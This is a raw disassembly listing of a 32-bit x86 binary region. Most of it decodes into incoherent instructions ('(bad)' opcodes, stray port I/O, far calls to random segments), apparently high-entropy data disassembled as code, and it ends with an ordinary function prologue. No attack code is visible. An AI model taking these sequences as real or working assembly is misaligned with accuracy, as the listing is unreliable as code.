  420d88:	addr16 retf 
  420d8a:	or     al,0x3d
  420d8c:	cld    
  420d8d:	adc    al,0x44
  420d8f:	popf   
  420d90:	cli    
  420d91:	sbb    DWORD PTR [ebx+edi*8+0x57],ebx
  420d95:	add    al,0x1d
  420d97:	out    0x2d,al
  420d99:	add    esi,DWORD PTR [ecx-0x28]
  420d9c:	leave  
  420d9d:	sbb    ch,cl
  420d9f:	rol    BYTE PTR [edx],1
  420da1:	and    DWORD PTR [esi-0x3610370c],edi
  420da7:	cmp    edi,edx
  420da9:	pop    es
  420daa:	stos   BYTE PTR es:[edi],al
  420dab:	sbb    DWORD PTR [edi+0x1],ecx
  420dae:	cld    
  420daf:	xor    DWORD PTR [edi+0x49],ebx
  420db2:	cdq    
  420db3:	and    ebx,ebx
  420db5:	enter  0x22ec,0x55
  420db9:	fwait
  420dba:	lods   al,BYTE PTR ds:[esi]
  420dbb:	and    ebp,esi
  420dbd:	jmp    0x420d5a
  420dbf:	jge    0x420e10
  420dc1:	or     BYTE PTR [edx-0x68428e8c],dl
  420dc7:	adc    DWORD PTR [edi],0xffffffa8
  420dca:	(bad)  
  420dcb:	xchg   esp,eax
  420dcc:	lea    edi,[ebx+0x4a]
  420dcf:	pop    edi
  420dd0:	jo     0x420dd6
  420dd2:	fadd   st(7),st
  420dd4:	call   0x1c3d:0xc4b40718
  420ddb:	mov    esp,0x1de1599
  420de0:	push   eax
  420de1:	or     BYTE PTR [eax],ah
  420de3:	(bad)  
  420de4:	xor    al,0x1a
  420de6:	rol    eax,0xdb
  420de9:	cmp    eax,0x1fe3ab3
  420dee:	push   cs
  420def:	std    
  420df0:	repz (bad)
  420df3:	arpl   WORD PTR [ecx+ebp*8],ax
  420df6:	xchg   esi,eax
  420df7:	lahf   
  420df8:	icebp  
  420df9:	pop    esi
  420dfa:	inc    esp
  420dfb:	lea    edx,[ebx]
  420dfd:	jbe    0x420dc2
  420dff:	data16 js 0x420e76
  420e02:	sub    esp,DWORD PTR [esi+0x1f9792c4]
  420e08:	out    0x6e,eax
  420e0a:	repnz loop 0x420e57
  420e0d:	hlt    
  420e0e:	mov    bh,BYTE PTR [ebx]
  420e10:	mov    dh,0xf6
  420e12:	xchg   ecx,eax
  420e13:	cmp    esp,ebp
  420e15:	push   ebp
  420e16:	cmc    
  420e17:	imul   ebp,edx,0xffffffe7
  420e1a:	ret    0xa8e6
  420e1d:	outs   dx,BYTE PTR ds:[esi]
  420e1e:	sahf   
  420e1f:	add    al,0x25
  420e21:	mov    ebp,0x439b8627
  420e26:	or     BYTE PTR [edx],dh
  420e28:	loop   0x420e48
  420e2a:	xchg   ebx,eax
  420e2b:	rcr    DWORD PTR [ecx-0x7d5abeb5],0xa3
  420e32:	icebp  
  420e33:	in     eax,dx
  420e34:	sub    BYTE PTR ds:0xefb33878,ch
  420e3a:	loope  0x420e72
  420e3c:	pop    ss
  420e3d:	dec    ebp
  420e3e:	mov    ah,0xfc
  420e40:	pop    eax
  420e41:	sahf   
  420e42:	(bad)  
  420e43:	sbb    BYTE PTR [esi+0x63],al
  420e46:	aad    0xa1
  420e48:	inc    esi
  420e49:	icebp  
  420e4a:	xor    bh,BYTE PTR [edx]
  420e4c:	in     eax,dx
  420e4d:	rcl    DWORD PTR [ebp+0x66],cl
  420e50:	repnz sbb al,BYTE PTR [eax]
  420e53:	jmp    0x420e70
  420e55:	ja     0x420dfe
  420e57:	mov    WORD PTR [ecx+0x1933d7e],es
  420e5d:	mov    al,ds:0xaf6268a5
  420e62:	jmp    0x420e96
  420e64:	inc    BYTE PTR [eax-0x71]
  420e67:	dec    ebx
  420e68:	dec    ecx
  420e69:	stos   DWORD PTR es:[edi],eax
  420e6a:	xchg   esi,eax
  420e6b:	push   ebx
  420e6c:	add    DWORD PTR [ecx-0x3a],0x62d05c9e
  420e73:	mov    al,ds:0xdd1df101
  420e78:	test   DWORD PTR [ebx-0x3c],ecx
  420e7b:	icebp  
  420e7c:	xor    ecx,ecx
  420e7e:	shl    DWORD PTR [esi+0x34],1
  420e81:	mov    cl,0x5a
  420e83:	pop    esi
  420e84:	aam    0x44
  420e86:	sub    dh,BYTE PTR [eax-0x183417d3]
  420e8c:	js     0x420e9e
  420e8e:	push   ss
  420e8f:	push   ebp
  420e90:	loope  0x420e58
  420e92:	gs dec esi
  420e94:	test   eax,0xfd8613fe
  420e99:	mov    edi,0x8d4d20f4
  420e9e:	imul   esi,DWORD PTR [esi],0x20
  420ea1:	bound  ecx,QWORD PTR [esi+edi*4+0x6b]
  420ea5:	dec    eax
  420ea6:	dec    eax
  420ea7:	cmp    al,0x95
  420ea9:	ret    
  420eaa:	pop    ss
  420eab:	inc    edx
  420eac:	sub    dl,BYTE PTR [edx+0x2907038e]
  420eb2:	xchg   ebp,eax
  420eb3:	into   
  420eb4:	scas   eax,DWORD PTR es:[edi]
  420eb5:	ds clc 
  420eb7:	mov    ds:0xfdd3cb3d,eax
  420ebc:	sub    DWORD PTR cs:[ecx+0x22405fa1],esp
  420ec3:	retf   0x59be
  420ec6:	and    al,0x82
  420ec8:	xchg   ebp,eax
  420ec9:	inc    esp
  420eca:	in     eax,dx
  420ecb:	inc    ecx
  420ecc:	ret    0xbf38
  420ecf:	call   0xda05:0x86244bfe
  420ed6:	pop    ebx
  420ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ed8:	jl     0x420eff
  420eda:	cmp    esp,DWORD PTR [ebx+esi*8-0x2894d1d6]
  420ee1:	mov    edx,0xe64bdcf9
  420ee6:	jbe    0x420ef9
  420ee8:	fucomp st(5)
  420eea:	and    eax,0xf98049c4
  420eef:	mov    ebx,0x166407d
  420ef4:	sti    
  420ef5:	fs fcmovnb st,st(0)
  420ef8:	fcmovbe st,st(1)
  420efa:	in     eax,0xd1
  420efc:	jg     0x420ee3
  420efe:	pop    edx
  420eff:	jmp    FWORD PTR [edx+0x7b]
  420f02:	xor    BYTE PTR [edx+ecx*4-0x6a],cl
  420f06:	call   0x1b39:0x1b8d1295
  420f0d:	jl     0x420f16
  420f0f:	dec    ebp
  420f10:	inc    edi
  420f11:	std    
  420f12:	and    al,0xae
  420f15:	shr    BYTE PTR [esi+ecx*8+0x70],cl
  420f19:	mov    edx,ebx
  420f1b:	bound  edx,QWORD PTR [ebp+0x1d]
  420f1e:	(bad)  
  420f1f:	or     al,0x18
  420f21:	jne    0x420f2f
  420f23:	test   BYTE PTR [esi],0x15
  420f26:	inc    ebp
  420f27:	jne    0x420fa8
  420f29:	call   0x40a9:0xaa056eb
  420f30:	xchg   DWORD PTR [edx+0x31],esi
  420f33:	call   0x148e52bb
  420f38:	popa   
  420f39:	loopne 0x420f32
  420f3b:	scas   al,BYTE PTR es:[edi]
  420f3c:	dec    eax
  420f3d:	loopne 0x420f82
  420f3f:	or     BYTE PTR [ebx+0x67bc4221],ah
  420f45:	popf   
  420f46:	ret    
  420f47:	lea    edx,es:[ecx-0x2]
  420f4b:	and    BYTE PTR [edi+0x6e],al
  420f4e:	inc    esi
  420f4f:	mov    BYTE PTR [eax+edi*4-0x3c5752e0],dl
  420f56:	push   esi
  420f57:	repz add edi,DWORD PTR fs:[ecx+ebp*8+0x403957e8]
  420f60:	loopne 0x420f22
  420f62:	fstp   QWORD PTR ds:0xef8e0716
  420f68:	add    al,0x9
  420f6a:	lea    esi,[ebx+esi*1-0x39]
  420f6e:	inc    esi
  420f6f:	fldenv [esi+0x1a]
  420f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f73:	enter  0x5d5f,0xeb
  420f77:	jbe    0x420fdc
  420f79:	push   esi
  420f7a:	ja     0x420f8a
  420f7c:	setnp  BYTE PTR [ecx]
  420f7f:	idiv   DWORD PTR [edi+edi*2+0x3e514086]
  420f86:	dec    ebx
  420f87:	push   cs
  420f88:	lahf   
  420f89:	push   edx
  420f8a:	or     BYTE PTR [ecx-0x714d2810],dh
  420f90:	shl    BYTE PTR [ebx+eax*2-0x50],cl
  420f94:	(bad)  
  420f95:	adc    BYTE PTR [eax*1-0x561c7fd6],dl
  420f9c:	jmp    0x420f5d
  420f9e:	retf   
  420f9f:	mov    WORD PTR ds:0xdbd6a2c,?
  420fa5:	pop    ecx
  420fa6:	mov    ch,0x2d
  420fa8:	jo     0x420fd7
  420faa:	push   edx
  420fab:	jp     0x421010
  420fad:	nop
  420fae:	stos   DWORD PTR es:[edi],eax
  420faf:	pop    ebx
  420fb0:	(bad)  
  420fb1:	stos   BYTE PTR es:[edi],al
  420fb2:	arpl   WORD PTR [esi-0x456a7bfc],dx
  420fb8:	imul   ecx,DWORD PTR [esi+edx*2],0x7d
  420fbc:	xor    eax,0xf2558315
  420fc1:	dec    edi
  420fc2:	hlt    
  420fc3:	push   eax
  420fc4:	dec    esi
  420fc5:	and    eax,0xfad0aadd
  420fca:	out    dx,al
  420fcb:	mov    eax,0x95eeaca8
  420fd0:	in     eax,0x76
  420fd2:	jp     0x421031
  420fd4:	mov    ds:0xd59cd462,al
  420fd9:	test   DWORD PTR [ecx-0x6f8a9e38],esp
  420fdf:	add    ecx,DWORD PTR [edi+0x63c2025a]
  420fe5:	ds sub al,0xd1
  420fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fe9:	add    dl,BYTE PTR [eax]
  420feb:	xchg   BYTE PTR [ebx-0x1b],bh
  420fee:	xlat   BYTE PTR ds:[ebx]
  420fef:	call   0xe7ab9e5c
  420ff4:	or     bh,cl
  420ff6:	mov    bh,0x7b
  420ff8:	lods   al,BYTE PTR ds:[esi]
  420ff9:	aad    0x2f
  420ffb:	sub    edx,0x998f84d0
  421001:	cld    
  421002:	hlt    
  421003:	loope  0x420fcb
  421005:	xor    dh,ch
  421007:	mov    al,0x11
  421009:	repnz shl DWORD PTR [eax+0x11],cl
  42100d:	cmp    ebp,DWORD PTR [esi+0x3]
  421010:	cmp    eax,0x40f0c57d
  421015:	jecxz  0x421016
  421017:	cmp    DWORD PTR [esi+eiz*8+0x5f],0xffffffae
  42101c:	add    ebp,ecx
  42101e:	js     0x421031
  421020:	add    ebp,DWORD PTR [edi+eax*4+0x7]
  421024:	push   0xffffffd6
  421026:	aam    0x80
  421028:	lock pop edx
  42102a:	or     BYTE PTR [edx-0x3b988819],ch
  421030:	cmp    al,0x25
  421032:	sub    al,0xbb
  421034:	icebp  
  421035:	(bad)  
  421036:	fcompp 
  421038:	pop    eax
  421039:	inc    esi
  42103a:	aam    0xa4
  42103c:	enter  0x1d5,0x7d
  421040:	aas    
  421041:	xor    esp,edi
  421043:	mov    WORD PTR [ebp+0x55],gs
  421046:	enter  0x433d,0x25
  42104a:	xor    al,0x14
  42104c:	sbb    dh,ah
  42104e:	div    DWORD PTR [ebp+0x18]
  421051:	mov    edi,?
  421053:	sahf   
  421054:	and    al,0x12
  421056:	sbb    ebp,DWORD PTR [ebx]
  421058:	or     bl,ah
  42105a:	loope  0x42104b
  42105c:	fs ret 0x726c
  421060:	pop    ds
  421061:	mov    ecx,esp
  421063:	ds sahf 
  421065:	fsubr  QWORD PTR [edx]
  421067:	cmc    
  421068:	sbb    BYTE PTR [eax-0x24005af1],al
  42106e:	hlt    
  42106f:	sbb    esp,DWORD PTR [edx-0x1]
  421072:	imul   esp,DWORD PTR [ecx+0x4a],0xffffff87
  421076:	pop    eax
  421077:	inc    ecx
  421078:	in     eax,0xff
  42107a:	ins    DWORD PTR es:[edi],dx
  42107b:	sbb    eax,0x9719a787
  421080:	sbb    ah,ch
  421082:	push   cs
  421083:	adc    esp,eax
  421085:	lahf   
  421086:	sar    DWORD PTR ds:0xb819f100,1
  42108c:	aas    
  42108d:	repz add eax,0x4a00b903
  421093:	mov    gs,WORD PTR [eax]
  421095:	inc    ebx
  421096:	enter  0x998a,0x97
  42109a:	and    DWORD PTR [ecx+0x1d],edi
  42109d:	loop   0x42105b
  42109f:	jnp    0x421037
  4210a1:	orps   xmm2,XMMWORD PTR [eax-0x6e292b9e]
  4210a8:	sahf   
  4210a9:	jg     0x4210f0
  4210ab:	add    eax,edi
  4210ad:	stc    
  4210ae:	mov    bh,0xb5
  4210b0:	mov    dh,0x67
  4210b2:	aam    0x99
  4210b4:	pop    ebx
  4210b5:	mov    eax,ds:0x97a1010c
  4210ba:	jns    0x421105
  4210bc:	dec    esi
  4210bd:	jae    0x4210b2
  4210bf:	pop    esi
  4210c0:	shl    ch,cl
  4210c2:	push   0x7fedec01
  4210c7:	push   ebx
  4210c8:	faddp  st(6),st
  4210ca:	push   eax
  4210cb:	shr    DWORD PTR [ecx+ecx*1],1
  4210ce:	xchg   edi,eax
  4210cf:	or     esp,DWORD PTR [esi+ebx*4-0x7cf56414]
  4210d6:	data16 daa 
  4210d8:	into   
  4210d9:	xchg   ebx,eax
  4210da:	jnp    0x42113a
  4210dc:	imul   ebp,DWORD PTR [edi+0x2b],0xc2bc2c22
  4210e3:	mov    al,0x9f
  4210e5:	pop    eax
  4210e6:	je     0x421154
  4210e8:	int    0x9e
  4210ea:	rol    DWORD PTR [edi],0xd7
  4210ed:	or     eax,0x70467ed8
  4210f2:	inc    edi
  4210f3:	cmp    DWORD PTR [ebx-0x2d],eax
  4210f6:	neg    BYTE PTR [edi-0x1d]
  4210f9:	cmp    eax,0xcec1f50e
  4210fe:	rcr    DWORD PTR [ebx+edi*4],1
  421101:	in     eax,0xd6
  421103:	imul   esi,DWORD PTR [ebx+ebx*8-0x13b0b790],0x57bfe5b9
  42110e:	retf   0x8720
  421111:	arpl   WORD PTR [edx],di
  421113:	sub    eax,0x20366866
  421118:	fstp   QWORD PTR [ebp+0x1f]
  42111b:	cmp    DWORD PTR [ecx*4-0x4fe87f58],esp
  421122:	jb     0x421149
  421124:	pop    es
  421125:	out    0xa8,eax
  421127:	jmp    0x2bc9:0x4dedc07d
  42112e:	ror    BYTE PTR ds:0xa1bce41e,cl
  421134:	out    dx,al
  421135:	loopne 0x4210da
  421137:	aas    
  421138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421139:	test   eax,0x1774386
  42113e:	pop    edx
  42113f:	or     BYTE PTR [esi],bh
  421141:	cmp    BYTE PTR [ebx],cl
  421143:	ja     0x4211a1
  421145:	inc    ecx
  421146:	fdivr  DWORD PTR [ecx]
  421148:	pop    ebp
  421149:	pop    esp
  42114a:	add    BYTE PTR [eiz*2-0x4086ec4e],dh
  421151:	(bad)  
  421153:	pop    ss
  421154:	dec    BYTE PTR [ebp-0x6c]
  421157:	mov    BYTE PTR [ebx+0x48],ah
  42115a:	fwait
  42115b:	imul   BYTE PTR [esi-0x2c91d87c]
  421161:	rcl    ch,0xc3
  421164:	call   0x8ba:0x2cf9e167
  42116b:	test   al,0x7b
  42116d:	sub    al,0x39
  42116f:	pop    ss
  421170:	daa    
  421171:	cmp    al,0xce
  421173:	nop
  421174:	lock test DWORD PTR [ecx],esi
  421177:	in     eax,dx
  421178:	mov    al,0x7e
  42117a:	das    
  42117b:	icebp  
  42117c:	push   cs
  42117d:	neg    edi
  42117f:	in     al,0x3
  421181:	aas    
  421182:	shl    BYTE PTR [edi+0x7ee80e7d],0x3d
  421189:	std    
  42118a:	jnp    0x4211c8
  42118c:	push   cs
  42118d:	or     BYTE PTR [esp+eax*2+0x46],al
  421191:	shr    DWORD PTR [esi-0x37d83a09],cl
  421197:	push   ds
  421198:	sbb    al,0x47
  42119a:	aas    
  42119b:	scas   al,BYTE PTR es:[edi]
  42119c:	adc    BYTE PTR [esi-0x63],dl
  42119f:	mov    dh,0x91
  4211a1:	pop    eax
  4211a2:	adc    bh,BYTE PTR [ebp+0x53]
  4211a5:	jge    0x42114f
  4211a7:	rcl    BYTE PTR [esi-0x40],cl
  4211aa:	call   0xa0497eec
  4211af:	int3   
  4211b0:	xor    edx,DWORD PTR [ebp+ebx*4-0x53]
  4211b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211b5:	retf   
  4211b6:	std    
  4211b7:	ficomp DWORD PTR [ebp+edx*8-0x55]
  4211bb:	iret   
  4211bc:	frstor ss:[edx]
  4211bf:	sub    BYTE PTR [edx-0x294387a2],bl
  4211c5:	inc    esp
  4211c6:	or     bh,BYTE PTR [ebx-0x224b56a3]
  4211cc:	jns    0x421241
  4211ce:	dec    ebx
  4211cf:	mov    ecx,0x6f7c6df6
  4211d4:	or     esp,DWORD PTR [ebx+ecx*8+0x25]
  4211d8:	test   ecx,edx
  4211da:	ins    BYTE PTR es:[edi],dx
  4211db:	push   esi
  4211dc:	jbe    0x4211b2
  4211de:	xchg   esp,eax
  4211df:	pop    es
  4211e0:	aas    
  4211e1:	pop    esp
  4211e2:	daa    
  4211e3:	popa   
  4211e4:	and    cl,0x7d
  4211e7:	jg     0x42116c
  4211e9:	jge    0x42116e
  4211eb:	aad    0x47
  4211ed:	adc    eax,0x88a4cefe
  4211f2:	cmp    al,0xa6
  4211f4:	les    eax,FWORD PTR [edi-0x4949d145]
  4211fa:	pop    ecx
  4211fb:	cmp    DWORD PTR [edx-0x2f5971b7],edx
  421201:	(bad)  
  421202:	int3   
  421203:	cmp    ebx,DWORD PTR [esi]
  421205:	lock xor bh,BYTE PTR [edi-0x3a49ff0f]
  42120c:	into   
  42120d:	fdiv   st,st(1)
  42120f:	call   0xcbfe:0x8bfc6002
  421216:	ja     0x4211fe
  421218:	mov    eax,0x710f4dc2
  42121d:	or     eax,0x80cd815f
  421222:	mov    ebx,0x65eaa7f9
  421227:	mov    edx,0xcab8c4a7
  42122c:	mov    edi,0xa1528eb2
  421231:	jmp    0x54c4dfcd
  421236:	adc    al,0x59
  421238:	arpl   WORD PTR [eax+0x15],sp
  42123b:	xor    eax,edi
  42123d:	adc    al,0x46
  42123f:	add    eax,0x83f91eaf
  421244:	mov    edi,0x9a74ada7
  421249:	mov    bh,0x60
  42124b:	out    dx,al
  42124c:	xor    al,cl
  42124e:	add    BYTE PTR [eax+eax*2-0x21],dh
  421252:	icebp  
  421253:	sahf   
  421254:	int    0xf8
  421256:	mov    al,ds:0x504b8046
  42125b:	fdiv   DWORD PTR [esi-0x23f4eca5]
  421261:	xlat   BYTE PTR ds:[ebx]
  421262:	jbe    0x4211f5
  421264:	cmp    ebx,edx
  421266:	js     0x421223
  421268:	jno    0x421216
  42126a:	out    dx,al
  42126b:	int    0x44
  42126d:	daa    
  42126e:	jge    0x421286
  421270:	arpl   WORD PTR [ebx-0x105ced8c],bx
  421276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421277:	pop    eax
  421278:	jae    0x42120a
  42127a:	push   edi
  42127b:	mov    ah,0xc8
  42127d:	dec    eax
  42127e:	adc    bh,0xf8
  421281:	adc    BYTE PTR [edi+ebp*2-0x69],cl
  421285:	pop    edi
  421286:	cmp    BYTE PTR ds:0x70a310c4,al
  42128c:	inc    ecx
  42128d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42128e:	lock shr cl,cl
  421291:	push   ss
  421292:	jmp    FWORD PTR [esi-0x2949fb05]
  421298:	hlt    
  421299:	mov    eax,ds:0x926a1281
  42129e:	dec    ecx
  42129f:	inc    ecx
  4212a0:	sub    ch,BYTE PTR [ebx+0x742aeb2e]
  4212a6:	jae    0x421236
  4212a8:	daa    
  4212a9:	(bad)  
  4212aa:	shl    BYTE PTR [eax+0x6ba840b7],0x78
  4212b1:	mov    eax,ds:0x563b2753
  4212b6:	std    
  4212b7:	pop    es
  4212b8:	add    DWORD PTR [ebp-0x24ab190e],edx
  4212be:	rol    DWORD PTR [edi+0x77b17d9f],1
  4212c4:	cmc    
  4212c5:	loop   0x421286
  4212c7:	lock sub dh,cl
  4212ca:	push   esi
  4212cb:	or     DWORD PTR [edx+0x4a8f921d],0x2a
  4212d2:	repnz mov al,ds:0x1771978
  4212d8:	test   BYTE PTR [edi-0x77],0xd6
  4212dc:	xchg   ecx,eax
  4212dd:	outs   dx,BYTE PTR ds:[esi]
  4212de:	sti    
  4212df:	sbb    DWORD PTR [edi+0x10],edx
  4212e2:	xchg   esi,eax
  4212e3:	ds adc al,0x9e
  4212e6:	imul   esi,DWORD PTR [ebx+0x1b],0xffffffc0
  4212ea:	neg    BYTE PTR [edx]
  4212ec:	imul   ebp,DWORD PTR [ebp-0x2e],0xeb32d6f9
  4212f3:	pop    es
  4212f4:	jmp    0x4212a7
  4212f6:	push   ebp
  4212f7:	fidivr DWORD PTR [edi+0x4a]
  4212fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212fc:	test   eax,0x46c2f6ce
  421301:	inc    ebx
  421302:	aad    0xc7
  421304:	sub    BYTE PTR [eax+edx*8],ch
  421307:	or     al,0xdd
  421309:	pop    esp
  42130a:	leave  
  42130b:	aad    0x58
  42130d:	loope  0x4212b9
  42130f:	mov    ebx,0x9d15fd61
  421314:	pusha  
  421315:	fsubrp st(2),st
  421317:	mov    ds:0xde354182,al
  42131c:	rcl    DWORD PTR [esi-0x43c6684d],cl
  421322:	repz iret 
  421324:	jnp    0x421325
  421326:	mov    ds:0x4f2267f6,al
  42132b:	lahf   
  42132c:	repnz mov ebp,ss
  42132f:	cmp    BYTE PTR [ecx+edi*4+0x66],al
  421333:	sahf   
  421334:	pushf  
  421335:	ficomp DWORD PTR [ebx]
  421337:	sti    
  421338:	and    cl,BYTE PTR [eax+0x5b30aef7]
  42133e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42133f:	leave  
  421340:	and    ch,BYTE PTR [edi-0x7e335130]
  421346:	cwde   
  421347:	inc    ebp
  421348:	addr16 push ds
  42134a:	and    BYTE PTR [ecx-0x208a16db],cl
  421350:	sar    bl,1
  421352:	dec    eax
  421353:	sbb    DWORD PTR [eiz*1-0x5e5fd6ad],esi
  42135a:	jecxz  0x4212e8
  42135c:	dec    eax
  42135d:	sbb    esi,DWORD PTR [ebp+ebx*4+0x6d]
  421361:	pop    es
  421362:	mov    cl,0x3d
  421364:	add    ebx,edx
  421366:	popa   
  421367:	pusha  
  421368:	call   0x7e51:0x65ff02c7
  42136f:	sub    eax,0x9861f8d8
  421374:	xor    bh,BYTE PTR [eax-0x27]
  421377:	js     0x421351
  421379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42137a:	dec    edx
  42137b:	das    
  42137c:	adc    ah,dl
  42137e:	push   edi
  42137f:	into   
  421380:	cmp    edx,ecx
  421382:	popf   
  421383:	rcl    esp,1
  421385:	mov    ch,0x74
  421387:	pushf  
  421388:	sbb    DWORD PTR ds:0x2b6f1520,esp
  42138e:	dec    edi
  42138f:	mov    ecx,0x566b0e0a
  421394:	bts    DWORD PTR [ecx],ecx
  421397:	mov    BYTE PTR [edi-0x1],al
  42139a:	scas   al,BYTE PTR es:[edi]
  42139b:	mov    edi,0x9a116722
  4213a0:	xchg   edi,eax
  4213a1:	cmp    DWORD PTR [esi],ebx
  4213a3:	xchg   edx,eax
  4213a4:	dec    esp
  4213a5:	and    eax,0x2caddd9e
  4213aa:	xor    DWORD PTR [esi],edi
  4213ac:	jmp    0x32b3968c
  4213b1:	pop    esi
  4213b2:	sbb    DWORD PTR ds:[edx],0xffffffc6
  4213b6:	jl     0x421432
  4213b8:	xchg   edx,eax
  4213b9:	and    dl,ch
  4213bb:	dec    edi
  4213bc:	pop    ss
  4213bd:	and    edx,DWORD PTR [edi]
  4213bf:	out    0x58,eax
  4213c1:	repnz aad 0x74
  4213c4:	pop    edi
  4213c5:	cmc    
  4213c6:	adc    eax,DWORD PTR [ebp+0x48]
  4213c9:	jb     0x4213ff
  4213cb:	xchg   ebp,eax
  4213cc:	and    al,ch
  4213ce:	dec    eax
  4213cf:	push   ss
  4213d0:	sub    DWORD PTR [eax-0x55a2952f],esi
  4213d6:	inc    eax
  4213d7:	pushf  
  4213d8:	and    BYTE PTR [esp+eax*2],bl
  4213db:	enter  0xae72,0xea
  4213df:	inc    edi
  4213e0:	or     DWORD PTR [eax+0xe2040d6],esp
  4213e6:	sub    DWORD PTR [eax],edx
  4213e8:	and    ebp,DWORD PTR [eax+0x536eb9f9]
  4213ee:	jle    0x421440
  4213f0:	mov    esi,esp
  4213f2:	or     ebx,DWORD PTR [edx]
  4213f4:	push   es
  4213f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213f6:	mov    DWORD PTR [ebp+eiz*8+0x7f8adcc5],esi
  4213fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213fe:	jns    0x4213d5
  421400:	xor    al,0x15
  421402:	int    0x22
  421404:	sar    DWORD PTR [edx-0x54],cl
  421407:	in     al,dx
  421408:	arpl   WORD PTR [ebx],cx
  42140a:	sbb    al,0x14
  42140c:	out    dx,ax
  42140e:	ins    DWORD PTR es:[edi],dx
  42140f:	mov    al,ds:0x34ea19f6
  421414:	push   edx
  421415:	mul    BYTE PTR [esp+edx*1]
  421418:	mov    ah,0x96
  42141a:	push   es
  42141b:	mov    edx,0xc1604c2
  421420:	ja     0x421436
  421422:	inc    ecx
  421423:	lea    ebx,[esi]
  421425:	sbb    ecx,0xffffffc5
  421428:	dec    esi
  421429:	mov    ebx,0x6faa6dbe
  42142e:	into   
  42142f:	xchg   BYTE PTR [ebx],cl
  421431:	popf   
  421432:	rcr    DWORD PTR [ebp-0x7a],cl
  421435:	adc    al,ch
  421437:	xchg   DWORD PTR [ecx-0x5f],esp
  42143a:	enter  0xe6e0,0xa7
  42143e:	dec    edx
  42143f:	push   ecx
  421440:	rcr    DWORD PTR [eax+eax*8-0x15],0x29
  421445:	mov    ds:0xfc04a2f5,al
  42144a:	dec    eax
  42144b:	mov    dl,0x8c
  42144d:	scas   eax,DWORD PTR es:[edi]
  42144e:	dec    edx
  42144f:	inc    BYTE PTR [ebp-0x80]
  421452:	fs stc 
  421454:	mov    ecx,0x1f78cab5
  421459:	and    esi,DWORD PTR [eax+0x3e]
  42145c:	imul   ebp,DWORD PTR [eax+0x298e46a0],0xbc7a8a1e
  421466:	adc    ecx,esp
  421468:	mov    ebp,0xee040202
  42146d:	icebp  
  42146e:	dec    edx
  42146f:	xchg   esp,eax
  421470:	stos   BYTE PTR es:[edi],al
  421471:	bound  esp,QWORD PTR [edi]
  421473:	ret    
  421474:	xchg   edx,eax
  421475:	adc    BYTE PTR [ecx-0x2a],0x40
  421479:	retf   0x735a
  42147c:	jmp    0x421411
  42147e:	pop    eax
  42147f:	not    BYTE PTR [ecx]
  421481:	scas   al,BYTE PTR es:[edi]
  421482:	sbb    BYTE PTR [edi+0x445dc07e],dh
  421488:	xchg   ebp,eax
  421489:	loop   0x4214ca
  42148b:	pop    eax
  42148c:	push   cs
  42148d:	je     0x4214cd
  42148f:	and    eax,0x1ecedf47
  421494:	inc    eax
  421495:	mov    ds:0x7a86dbb9,eax
  42149a:	adc    DWORD PTR [esi-0x18],0xdd1425e7
  4214a1:	ja     0x4214b6
  4214a3:	sbb    BYTE PTR [edx-0x5d],0xcd
  4214a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a8:	dec    esi
  4214a9:	sti    
  4214aa:	inc    eax
  4214ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214ac:	call   0x77c9:0x9e33a18a
  4214b3:	fsubr  DWORD PTR [ebx+ecx*4-0x103c41a]
  4214ba:	mov    edx,0x4159202
  4214bf:	ss loope 0x42151e
  4214c2:	mov    cl,ch
  4214c4:	mov    ds:0xd68772eb,al
  4214c9:	xor    al,0xe2
  4214cb:	push   ebp
  4214cc:	add    ecx,DWORD PTR [ebp-0x718ce608]
  4214d2:	ficomp WORD PTR [ecx-0x24]
  4214d5:	cmp    DWORD PTR [eax+ebx*8-0x35],esi
  4214d9:	sti    
  4214da:	ja     0x4214b5
  4214dc:	mov    ecx,0x1c2b0a6c
  4214e1:	fcomp  DWORD PTR [edx-0x251f5ac8]
  4214e7:	pop    ebx
  4214e8:	je     0x4214e2
  4214ea:	xchg   ecx,eax
  4214eb:	test   BYTE PTR [ebx-0x61a5eb09],dh
  4214f1:	mov    dh,0x52
  4214f3:	mov    esp,esp
  4214f5:	pop    ecx
  4214f6:	pushf  
  4214f7:	and    al,0xe9
  4214f9:	push   ebp
  4214fa:	push   eax
  4214fb:	mov    BYTE PTR ds:0x2889d8f5,bh
  421501:	cld    
  421502:	jae    0x4214f2
  421504:	jecxz  0x42150e
  421506:	jbe    0x421544
  421508:	mov    edi,0xebc2041
  42150d:	sub    BYTE PTR [edx+0x35],dh
  421510:	add    al,0x2c
  421512:	fxch   st(2)
  421514:	ss xchg esp,eax
  421516:	icebp  
  421517:	maxps  xmm4,xmm1
  42151a:	or     eax,DWORD PTR [ebx]
  42151c:	mov    ds:0x9c333518,al
  421521:	test   eax,0xf111b6ce
  421526:	loop   0x421528
  421528:	int    0x8
  42152a:	hlt    
  42152b:	xchg   BYTE PTR [eax+0x2d09ddb1],dl
  421531:	mov    ah,0x5d
  421533:	addr16 daa 
  421535:	test   al,0x80
  421537:	jg     0x4214b9
  421539:	dec    eax
  42153a:	mov    ds:0x1824ca04,eax
  42153f:	mov    esp,0x5e88d858
  421544:	pop    ebp
  421545:	pop    ecx
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x70
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x48],0x0
  42155e:	mov    DWORD PTR [ebp-0x70],0x0
  421565:	mov    DWORD PTR [ebp-0x18],0x0
  42156c:	mov    DWORD PTR [ebp-0x10],0x0
  421573:	mov    DWORD PTR [ebp-0x14],0x0
